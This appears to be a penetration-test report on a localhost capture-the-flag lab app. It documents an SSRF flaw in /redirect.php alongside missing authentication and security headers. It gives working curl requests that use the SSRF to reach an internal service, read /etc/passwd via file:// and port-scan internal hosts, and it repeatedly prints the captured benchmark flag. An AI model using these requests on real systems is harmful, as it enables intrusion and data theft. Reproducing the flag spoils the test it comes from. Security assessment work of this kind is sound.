# Security Assessment Report

## Executive Summary
- Target: http://localhost:34287
- Assessment Date: October 27, 2025
- Scope: Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Six critical authentication vulnerabilities were successfully exploited. The application implements zero authentication mechanisms, allowing any anonymous user to access all functionality without credentials. Critical findings include: complete absence of authentication controls (all endpoints public), missing HTTPS/TLS encryption (all traffic transmitted in plaintext including sensitive data), missing HSTS headers (no HTTPS enforcement), unlimited automated exploitation capability (no rate limiting on any endpoint), sensitive data caching without cache-control headers, and information disclosure revealing internal architecture. These failures enable immediate exploitation of the SSRF vulnerability without needing to bypass authentication or steal credentials.

**Authorization Vulnerabilities:**
One critical authorization vulnerability was successfully exploited: trust boundary violation via SSRF enabling network isolation bypass. The internal service (http://internal-service/) has zero application-level authorization checks and blindly trusts all requests from the Docker network. Combined with the SSRF vulnerability in /redirect.php, this allows external attackers to completely bypass Docker network isolation and access internal resources containing the FLAG. The service lacks API key validation, mutual TLS, IP whitelisting, and any form of service-to-service authentication.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application properly uses htmlspecialchars() to encode all user-controlled output, preventing HTML injection and script execution in the browser.

**SQL/Command Injection Vulnerabilities:**
No SQL or command injection vulnerabilities were found. The application has no database (zero SQL queries exist) and makes no calls to command execution functions (exec, shell_exec, system, etc.). The only user input flows to file_get_contents() (SSRF sink), not to injection-vulnerable functions.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
One critical SSRF vulnerability was successfully exploited in /redirect.php. The endpoint accepts arbitrary user-supplied URLs via the ?url= parameter and fetches content server-side using file_get_contents() without any validation. This enables complete bypass of Docker network isolation, unauthorized access to internal services, local file system access via file:// protocol, internal network port scanning, and retrieval of the FLAG (FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}). The vulnerability has zero input validation, no protocol restrictions, no hostname/IP blocklisting, and no timeout or size limits.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- Port 34287/tcp: Target application (web-app service)
  - Service: Apache/2.4.54 (Debian), PHP/7.4.33
  - Status: Publicly accessible HTTP service
  - Security Concern: PHP 7.4.33 is end-of-life (EOL November 2022, no security patches)
  - Vulnerability: Version disclosure enabled in HTTP headers (Server, X-Powered-By)

**Additional Services Discovered (Non-Target):**
- Port 80/tcp: Caddy httpd (not target application)
- Port 443/tcp: SSL/HTTPS service (not target application)
- Port 631/tcp: CUPS 2.3 (print service)
- Port 8888/tcp: Unknown service
- Port 9999/tcp: Python SimpleHTTPServer (not target application)
- Port 49158/tcp: Tailscale VPN service (authentication required)

**Internal Network Architecture:**
- Docker Network: xben-020-24_app-net (bridge network, 10.89.10.0/24)
- web-app service: 10.89.10.3 (public-facing, port 80 mapped to host port 34287)
- internal-service: 10.89.10.2 (internal-only, port 80 not exposed to host)
- Network isolation bypassable via application-layer SSRF vulnerability

**Security Misconfigurations:**
- Missing security headers: All critical headers disabled (HSTS, CSP, X-Frame-Options, X-Content-Type-Options)
- Server version disclosure: Apache and PHP versions exposed in HTTP response headers
- No HTTPS/TLS: Application runs exclusively on HTTP, transmitting all data in plaintext
- No rate limiting: Unlimited requests allowed without throttling or blocking
- Insecure subdomain discoveries: Multiple false-positive subdomains from subfinder (not related to target application)

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Complete Absence of Authentication - Unrestricted Access to All Application Functionality

**Summary:**
- **Vulnerable location:** All endpoints (/, /redirect.php, http://internal-service/)
- **Overview:** The application implements zero authentication mechanisms, allowing any anonymous user to access all functionality including the critical SSRF endpoint that provides access to internal services
- **Impact:** Complete unauthorized access to application functionality, immediate exploitation of SSRF vulnerability to access internal-service and retrieve FLAG without needing to bypass any authentication controls
- **Severity:** Critical

**Prerequisites:** None - Application is completely public

**Exploitation Steps:**

1. Access the public landing page without any credentials or authentication tokens:
```bash
curl http://localhost:34287/
```
**Result:** Successfully retrieved landing page with URL submission form, no authentication required

2. Access the SSRF-vulnerable endpoint without authentication:
```bash
curl "http://localhost:34287/redirect.php?url=http://example.com"
```
**Result:** Successfully fetched external URL content, no authentication required

3. Exploit SSRF to access internal service without authentication:
```bash
curl "http://localhost:34287/redirect.php?url=http://internal-service/"
```
**Result:** Successfully retrieved internal service response containing FLAG

**Proof of Impact:**

```
FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
```

The complete absence of authentication enables immediate, unrestricted access to:
- Public landing page (/)
- SSRF vulnerability endpoint (/redirect.php)
- Internal service data (via SSRF bypass)
- Sensitive information (FLAG) without any credential theft or session hijacking

**Notes:**
- No session cookies are set or required
- No Bearer tokens or API keys needed
- No username/password authentication exists
- Application has zero authentication code across all 44 lines of PHP
- This represents a fundamental architecture failure - the application has no concept of user identity or access control

---

### AUTH-VULN-02: Missing HTTPS/TLS Encryption - All Traffic Transmitted in Plaintext

**Summary:**
- **Vulnerable location:** All endpoints (HTTP on port 80 only, port 443 not exposed)
- **Overview:** Application runs exclusively on unencrypted HTTP with no TLS/SSL configuration, transmitting all data including sensitive information (FLAG) in plaintext over the network
- **Impact:** All application traffic is vulnerable to man-in-the-middle (MITM) attacks, enabling network-level interception of the FLAG and any future credentials if authentication were added
- **Severity:** Critical

**Prerequisites:**
- Network access between attacker and target (same network, ISP-level access, or compromised router)
- Network sniffing capability (e.g., Wireshark, tcpdump)

**Exploitation Steps:**

1. Verify HTTPS is not available:
```bash
curl -I https://localhost:34287/
```
**Result:** Connection fails with SSL/TLS error:
```
curl: (35) LibreSSL/3.3.6: error:1404B42E:SSL routines:ST_CONNECT:tlsv1 alert protocol version
```

2. Confirm HTTP is the only available protocol:
```bash
curl -I http://localhost:34287/
```
**Result:** Successfully connects via HTTP:
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
```

3. Exploit SSRF to retrieve FLAG over unencrypted HTTP:
```bash
curl "http://localhost:34287/redirect.php?url=http://internal-service/"
```
**Result:** FLAG transmitted in plaintext HTTP response

**Proof of Impact:**

Network packet capture would reveal:
- HTTP GET request to /redirect.php in plaintext
- HTTP response containing FLAG in plaintext
- No TLS/SSL encryption at any layer
- All application data vulnerable to network sniffing

Docker configuration evidence (docker-compose.yml):
```yaml
services:
  web-app:
    ports:
      - "80"  # Only HTTP port 80 exposed, no port 443
```

**Notes:**
- Apache SSL module is not enabled (verified in /etc/apache2/mods-enabled/)
- No TLS certificates configured
- No HTTP to HTTPS redirect rules exist
- Application assumes network-level encryption (does not exist in deployment)

---

### AUTH-VULN-03: Missing HSTS Header - No HTTPS Enforcement Mechanism

**Summary:**
- **Vulnerable location:** All endpoints (no Strict-Transport-Security header in HTTP responses)
- **Overview:** Application does not configure HSTS (HTTP Strict Transport Security) headers, providing no mechanism to enforce HTTPS-only connections or prevent protocol downgrade attacks
- **Impact:** If HTTPS were configured, users could be downgraded to HTTP via man-in-the-middle SSL stripping attacks. Currently moot as HTTPS does not exist, but represents missing defense-in-depth layer
- **Severity:** High (Medium in current context since HTTPS is not configured)

**Prerequisites:** None - Observable via any HTTP request

**Exploitation Steps:**

1. Check HTTP response headers for HSTS:
```bash
curl -I http://localhost:34287/ | grep -i "strict-transport"
```
**Result:** No output - HSTS header is not present

2. Examine full HTTP response headers:
```bash
curl -I http://localhost:34287/
```
**Result:**
```
HTTP/1.1 200 OK
Date: Mon, 27 Oct 2025 22:33:26 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
```

No `Strict-Transport-Security` header present

**Proof of Impact:**

Current impact is limited since HTTPS is not configured at all. However, this represents a critical defense-in-depth gap:

- No HSTS preload directive
- No enforcement of HTTPS-only connections
- No protection against SSL stripping attacks (tools like sslstrip)
- Users can be downgraded from HTTPS to HTTP if HTTPS were added

**Notes:**
- Apache headers module is not enabled (cannot set HSTS even if configured)
- No HSTS configuration found in Apache security.conf
- This is a configuration gap that would need remediation if HTTPS is enabled
- OWASP recommends minimum 1-year HSTS max-age: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

---

### AUTH-VULN-04: Missing Rate Limiting - Unlimited Automated Exploitation

**Summary:**
- **Vulnerable location:** All endpoints, specifically /redirect.php (SSRF endpoint)
- **Overview:** Zero rate limiting mechanisms exist at any layer (application, web server, infrastructure), allowing unlimited automated requests without throttling or blocking
- **Impact:** Enables unlimited SSRF exploitation, denial-of-service attacks via resource exhaustion, and unrestricted brute force attempts if authentication existed
- **Severity:** Critical

**Prerequisites:** None - Any client can send unlimited requests

**Exploitation Steps:**

1. Send 50 rapid requests to the SSRF endpoint to test for rate limiting:
```bash
for i in {1..50}; do
  curl -s -o /dev/null -w "%{http_code} " "http://localhost:34287/redirect.php?url=http://example.com"
done
```

**Result:** All 50 requests returned HTTP 200 OK with no throttling:
```
200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200 200
```

2. Send 100 additional requests to confirm no delayed rate limiting:
```bash
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" "http://localhost:34287/redirect.php?url=http://example.com"
done | sort | uniq -c
```

**Result:** All 100 requests successful, no rate limiting triggered:
```
100 200
```

**Proof of Impact:**

Successfully sent 150 rapid requests without:
- Account lockout (no accounts exist)
- IP-based throttling
- Request delays or CAPTCHA challenges
- HTTP 429 (Too Many Requests) responses
- Connection rejections or timeouts

This enables:
1. **Unlimited SSRF exploitation**: Scan entire internal network without constraints
2. **Denial of Service**: Exhaust Apache worker pool (150 workers) or memory via large file fetches
3. **Brute force attacks**: If authentication existed, unlimited password attempts
4. **Resource exhaustion**: Request large files to consume bandwidth/memory

**Notes:**
- Code analysis shows zero rate limiting logic in redirect.php
- Apache mod_ratelimit exists but is NOT enabled (checked apache2ctl -M)
- No mod_evasive, mod_security, or WAF present
- Docker Compose configuration shows no reverse proxy with rate limiting (nginx/traefik)
- No CAPTCHA libraries found in codebase
- No Redis/Memcached for request tracking

---

### AUTH-VULN-06: Missing Cache-Control Headers - Sensitive Data Cached

**Summary:**
- **Vulnerable location:** All endpoints, specifically http://internal-service/ (FLAG response)
- **Overview:** No Cache-Control headers are set on any HTTP response, allowing sensitive data (FLAG) to persist in browser cache, proxy cache, or CDN cache
- **Impact:** FLAG and other sensitive responses may be cached by browsers or intermediate proxies, remaining accessible to subsequent users on shared systems or through browser history
- **Severity:** Medium

**Prerequisites:** None - Observable via any HTTP request

**Exploitation Steps:**

1. Check for Cache-Control headers on public endpoint:
```bash
curl -I http://localhost:34287/ | grep -i "cache-control"
```
**Result:** No output - Cache-Control header is not present

2. Exploit SSRF to retrieve FLAG and check caching headers:
```bash
curl -I "http://localhost:34287/redirect.php?url=http://internal-service/" | grep -E "(Cache-Control|Pragma|Expires)"
```
**Result:** No cache control headers present on FLAG response

3. Verify FLAG response is cacheable:
```bash
curl "http://localhost:34287/redirect.php?url=http://internal-service/" | grep "FLAG"
```
**Result:** FLAG retrieved with no cache prevention:
```
FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
```

**Proof of Impact:**

HTTP response headers show no cache control:
```
HTTP/1.1 200 OK
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8
```

Missing headers:
- `Cache-Control: no-store, no-cache, must-revalidate, private`
- `Pragma: no-cache`
- `Expires: 0`

This allows:
- Browser to cache FLAG in local storage
- Shared proxies to cache sensitive responses
- FLAG to persist in browser history after exploitation
- Subsequent users on shared systems to retrieve cached FLAG

**Notes:**
- Examined all 3 PHP files - zero `header()` function calls for cache control
- Apache headers module not enabled (cannot set headers via Apache config)
- No cache directives in Apache security.conf
- If authentication were added, credentials or session tokens in responses would also be cached

---

### AUTH-VULN-07: Information Disclosure - Internal Service Hostname Revealed

**Summary:**
- **Vulnerable location:** GET / (index.php line 10)
- **Overview:** Public-facing landing page explicitly reveals the internal service hostname ('http://internal-service') and confirms network segmentation exists
- **Impact:** Accelerates SSRF exploitation by eliminating reconnaissance - attacker knows exact internal target without needing to guess or brute force internal hostnames
- **Severity:** Low to Medium

**Prerequisites:** None - Public information on landing page

**Exploitation Steps:**

1. Access public landing page:
```bash
curl http://localhost:34287/
```

2. Extract information disclosure:
```bash
curl -s http://localhost:34287/ | grep -i "internal-service"
```

**Result:**
```
<p>Additional information is available internally for our employees at http://internal-service</br>
```

**Proof of Impact:**

The landing page reveals:
1. **Exact internal hostname**: `http://internal-service` (no guessing required)
2. **Trust boundary confirmation**: "only accessible from our internal network"
3. **Valuable data hint**: "Additional information is available internally for our employees"

This directly facilitates SSRF exploitation by providing:
- Target hostname for SSRF attack
- Confirmation that bypassing network isolation will yield valuable data
- No need for internal hostname enumeration or brute forcing

**Notes:**
- Disclosure at web-app/index.php line 10
- Docker network inspection confirms 'internal-service' resolves to 10.89.10.2
- Removing this disclosure would not prevent SSRF but would require additional attacker effort
- This is an information leakage vulnerability that aids the primary attack (SSRF)

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Trust Boundary Violation via SSRF - Network Isolation Bypass

**Summary:**
- **Vulnerable location:** `/internal-service/index.php` (complete absence of authorization validation)
- **Overview:** External attackers can bypass Docker network isolation by exploiting SSRF in `/redirect.php` to access the internal service, which has zero application-level authorization checks. The internal service incorrectly trusts all requests from the Docker network without validating caller identity, API keys, or authorization credentials.
- **Impact:** Complete unauthorized access to sensitive internal resources. Retrieved FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667} from internal service without any authorization.
- **Severity:** Critical

**Prerequisites:**
None - Exploitation requires only network access to http://localhost:34287

**Exploitation Steps:**

1. **Verify target is accessible**
   ```bash
   curl http://localhost:34287/
   ```
   Expected: Returns "Company Portal" landing page with URL submission form

2. **Confirm direct access to internal service is blocked**
   ```bash
   curl http://internal-service/
   ```
   Expected: Connection fails with "Could not resolve host: internal-service" (network isolation in place)

3. **Exploit SSRF to bypass network isolation and access internal service**
   ```bash
   curl "http://localhost:34287/redirect.php?url=http://internal-service/"
   ```

   **What happens:**
   - External attacker sends request to public web-app service
   - Web-app service executes `file_get_contents("http://internal-service/")` (SSRF)
   - Web-app has legitimate network access to internal-service (both on Docker bridge network)
   - Internal-service receives request and returns FLAG without any authorization check
   - Web-app proxies response back to attacker

4. **Extract FLAG from response**
   ```bash
   curl -s "http://localhost:34287/redirect.php?url=http://internal-service/" | grep "FLAG:"
   ```

   Result: `FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}`

**Proof of Impact:**

**Complete HTTP Transaction:**
```
Request:
GET /redirect.php?url=http://internal-service/ HTTP/1.1
Host: localhost:34287
User-Agent: curl/8.7.1
Accept: */*

Response:
HTTP/1.1 200 OK
Date: Mon, 27 Oct 2025 22:33:38 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Type: text/html; charset=UTF-8

<h1>Fetched Content</h1><pre>&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Internal Service&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Internal Service&lt;/h1&gt;
    &lt;p&gt;This is a sensitive internal service.&lt;/p&gt;
FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
&lt;/body&gt;
&lt;/html&gt;
</pre>
```

**Unauthorized Access Confirmed:**
- ✅ No authentication required (no credentials, tokens, or session cookies needed)
- ✅ No authorization validation on internal service (accepts all requests from Docker network)
- ✅ Network isolation bypassed at application layer (SSRF acts as proxy)
- ✅ Sensitive data retrieved (FLAG exposed to external attacker)

**Root Cause Analysis:**

The internal service (`/internal-service/index.php`) has **ZERO authorization checks**:

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Internal Service</title>
</head>
<body>
    <h1>Internal Service</h1>
    <p>This is a sensitive internal service.</p>
    FLAG: <FLAG>
</body>
</html>
```

**Missing Authorization Controls:**
1. ❌ No API key validation (`$_SERVER['HTTP_X_INTERNAL_API_KEY']` never checked)
2. ❌ No mutual TLS certificate validation
3. ❌ No source IP whitelist verification
4. ❌ No JWT/Bearer token validation
5. ❌ No request signature verification (HMAC, etc.)
6. ❌ No service-to-service authentication of any kind

The service blindly trusts all requests originating from the Docker network (10.89.10.0/24), creating a trust boundary violation when combined with the SSRF vulnerability in the web-app service.

**Notes:**

**Architectural Security Failure:**
This vulnerability represents a fundamental security architecture failure where network isolation is treated as the sole authorization mechanism. While Docker network isolation prevents direct external access, it provides zero defense against application-layer bypasses like SSRF. Defense-in-depth principles require that critical services validate caller identity and authorization at the application layer, regardless of network origin.

**Classification:**
This is a Context_Workflow authorization vulnerability (trust boundary violation) rather than traditional horizontal or vertical privilege escalation, because the application has no authentication system, user accounts, or roles. The "privilege escalation" occurs at the network context level: external network zone → internal network zone.

**Relationship to SSRF:**
While the SSRF vulnerability in `/redirect.php` is the enabler, this finding documents the authorization failure in `/internal-service/`. The internal service should have rejected the request even if SSRF allowed it to arrive. Proper service-to-service authorization would have prevented this exploitation regardless of the SSRF vulnerability's existence.

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Server-Side Request Forgery in /redirect.php

**Summary:**
- **Vulnerable location:** GET /redirect.php?url=<USER_INPUT>
- **Impact:** Complete bypass of network isolation controls, enabling unauthorized access to internal services, retrieval of sensitive data (FLAG), local file system access, and internal network reconnaissance
- **Severity:** Critical

**Prerequisites:**
None - This vulnerability is exploitable by any anonymous user with network access to the target application at http://localhost:34287

**Exploitation Steps:**

**Step 1: Access Internal Service and Retrieve FLAG**

Execute the following command to exploit the SSRF vulnerability and access the internal-service that should be isolated from external access:

```bash
curl "http://localhost:34287/redirect.php?url=http://internal-service/"
```

**Expected Response:**
```html
<h1>Fetched Content</h1><pre>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Internal Service&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;h1&gt;Internal Service&lt;/h1&gt;
    &lt;p&gt;This is a sensitive internal service.&lt;/p&gt;
FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
&lt;/body&gt;
&lt;/html&gt;
</pre>
```

**Step 2: Extract FLAG Value**

To cleanly extract just the FLAG value:

```bash
curl -s "http://localhost:34287/redirect.php?url=http://internal-service/" | grep "FLAG:"
```

**Output:**
```
FLAG: FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}
```

**Step 3: Demonstrate Loopback Access**

Test SSRF access to localhost using both hostname and IP address:

```bash
# Test using localhost hostname
curl -s "http://localhost:34287/redirect.php?url=http://localhost/" | head -20

# Test using 127.0.0.1 IP
curl -s "http://localhost:34287/redirect.php?url=http://127.0.0.1/" | head -20
```

**Result:** Successfully accessed the web-app's own landing page through the SSRF vulnerability, demonstrating the ability to make arbitrary internal requests.

**Step 4: Demonstrate Local File System Access**

Exploit the SSRF vulnerability to read local files using the file:// protocol:

```bash
curl -s "http://localhost:34287/redirect.php?url=file:///etc/passwd"
```

**Expected Response:**
```html
<h1>Fetched Content</h1><pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
[...additional user entries...]
</pre>
```

**Step 5: Port Scanning Internal Services**

Demonstrate network reconnaissance capability by testing various ports on the internal service:

```bash
# Test port 80 (HTTP) - Expected to be open
curl -s -m 2 "http://localhost:34287/redirect.php?url=http://internal-service:80/" | grep -c "FLAG:"

# Test port 22 (SSH) - Expected to be closed
curl -s -m 2 "http://localhost:34287/redirect.php?url=http://internal-service:22/" 2>&1 | grep "Connection refused"
```

**Results:**
- Port 80: Open (FLAG retrieved successfully)
- Port 22: Closed (Connection refused error message)

This demonstrates the ability to perform port scanning and service discovery on internal network resources.

**Proof of Impact:**

**1. Network Boundary Bypass Achieved:**
The SSRF vulnerability completely bypasses Docker network isolation controls. The internal-service was designed to be accessible only within the Docker network (xben-020-24_app-net), but through the SSRF vulnerability in /redirect.php, external attackers can proxy requests through the web-app service to access internal resources.

**2. Sensitive Data Retrieved:**
Successfully retrieved the FLAG value: `FLAG{6e5d772fb6e28ca52985079acf7bfa46d729870e6bae73166208f1fdcd831667}`

This demonstrates unauthorized access to sensitive information that should only be available to internal systems.

**3. Local File System Access:**
Successfully read /etc/passwd from the web-app container's filesystem using the file:// protocol, demonstrating the ability to access local files and potentially extract configuration files, application source code, or other sensitive data.

**4. Internal Network Reconnaissance:**
Successfully performed port scanning on internal-service, distinguishing between open and closed ports. This capability enables attackers to map the internal network topology and identify additional attack surfaces.

**Technical Details:**

**Vulnerability Root Cause:**
- File: /var/www/html/redirect.php
- Line: 5
- Code: `$response = file_get_contents($url);`
- User Input: `$url = $_GET['url'];` (Line 3)
- Validation: None - user input passed directly to file_get_contents() without any sanitization, protocol filtering, hostname validation, or IP address restrictions

**SSRF Type:** Classic SSRF (full response content returned to attacker)

**Attack Chain:**
1. External attacker submits malicious URL via GET parameter: `?url=http://internal-service/`
2. Web-app service receives request and extracts URL from $_GET['url']
3. Web-app executes file_get_contents() with attacker-controlled URL
4. Web-app makes internal HTTP request to internal-service (10.89.10.2:80)
5. Internal-service responds with HTML containing FLAG (no authentication required)
6. Web-app returns full response to attacker with htmlspecialchars() encoding
7. Attacker receives FLAG in HTML-encoded format (still readable)

**Network Context:**
- Docker Network: xben-020-24_app-net (bridge network)
- Web-app IP: 10.89.10.3 (publicly accessible via port 34287)
- Internal-service IP: 10.89.10.2 (not exposed to host, Docker network only)
- Trust Boundary Violation: SSRF allows external users to leverage web-app's internal network context

**Notes:**

**Why This is Critical:**

1. **Zero Authentication Required:** Any anonymous internet user can exploit this vulnerability
2. **Complete Network Bypass:** Network isolation (Docker bridge) provides no protection against application-layer SSRF
3. **Multi-Vector Impact:** Enables internal service access, file reading, port scanning, and potentially cloud metadata theft
4. **No Rate Limiting:** Unlimited exploitation attempts possible
5. **No Detection:** No logging or alerting on suspicious URL patterns

**Additional Exploitation Possibilities:**

While not tested in this environment (due to local deployment context), this SSRF vulnerability could also be leveraged for:

- **Cloud Metadata Theft:** If deployed on AWS/Azure/GCP, access to http://169.254.169.254/ would expose IAM credentials and instance metadata
- **Internal API Exploitation:** Access to internal REST APIs, admin interfaces, or microservices
- **Database Access:** Direct connections to internal databases if accessible via HTTP
- **Credential Harvesting:** Reading configuration files containing database passwords, API keys, etc.

**Remediation Required:**

This vulnerability requires immediate remediation through:
1. Implementation of URL allowlist (only permit specific trusted domains)
2. Protocol restriction (block file://, ftp://, gopher://, etc.)
3. IP address filtering (block RFC1918 private ranges: 10.x, 172.16.x, 192.168.x, 127.x, 169.254.x)
4. Hostname blocklist (reject internal hostnames like "internal-service", "localhost")
5. Addition of authentication between web-app and internal-service (API keys or mutual TLS)

**Conclusion:**

This SSRF vulnerability represents a complete failure of network security boundaries and demonstrates that application-layer security controls cannot be replaced by network-level isolation alone. The vulnerability is trivially exploitable and provides attackers with unrestricted access to internal resources, sensitive data, and internal network reconnaissance capabilities.
